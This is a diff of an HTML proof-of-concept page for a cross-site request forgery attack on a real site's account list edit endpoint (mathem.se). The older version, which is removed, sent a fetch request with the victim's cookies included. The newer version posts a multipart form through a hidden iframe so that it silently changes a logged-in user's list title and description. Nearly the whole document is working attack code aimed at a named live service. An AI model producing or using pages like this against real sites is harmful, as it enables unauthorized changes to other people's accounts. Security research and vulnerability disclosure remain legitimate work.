@@ -1,49 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>CSRF PoC with Submit & Error Feedback</title>
+  <title>CSRF PoC Manual Submit</title>
 </head>
 <body>
-  <h1>CSRF PoC using multipart/form-data</h1>
-  
-  <form id="csrfForm" action="https://www.mathem.se/se/account/lists/edit/" method="POST" enctype="multipart/form-data">
-    <input type="text" name="title" value="CSRF Attack" />
-    <textarea name="description" style="display:none;">This was changed via CSRF PoC using multipart/form-data</textarea>
-    <input type="submit" value="Submit CSRF" />
+
+  <h1>CSRF PoC — Manual Submit with Feedback</h1>
+
+  <form id="csrfForm" action="https://www.mathem.se/se/account/lists/edit/" method="POST" enctype="multipart/form-data" target="hiddenFrame">
+    <label>Title:</label><br>
+    <input type="text" name="title" value="CSRF Attack"><br><br>
+
+    <label>Description:</label><br>
+    <textarea name="description">CSRF via multipart/form-data</textarea><br><br>
+
+    <input type="submit" value="Submit CSRF Request">
   </form>
 
-  <p id="status"></p>
+  <p id="status">Waiting for submission...</p>
 
-  <script>
-    const form = document.getElementById('csrfForm');
-    const status = document.getElementById('status');
+  <!-- Hidden iframe for silent form submission -->
+  <iframe name="hiddenFrame" style="display:none;" onload="document.getElementById('status').textContent = 'Request submitted. Check target server response.';"></iframe>
 
-    form.addEventListener('submit', function(event) {
-      event.preventDefault(); // prevent default form submit
-      
-      const formData = new FormData(form);
-
-      fetch(form.action, {
-        method: 'POST',
-        credentials: 'include',
-        body: formData
-      })
-      .then(response => {
-        status.textContent = 'Response status: ' + response.status;
-        return response.text();
-      })
-      .then(text => {
-        console.log('Response body:', text);
-      })
-      .catch(error => {
-        status.textContent = 'Error: ' + error;
-        console.error('Fetch error:', error);
-        // fallback: do a normal submit if fetch fails
-        form.removeEventListener('submit', arguments.callee);
-        form.submit();
-      });
-    });
-  </script>
 </body>
 </html>
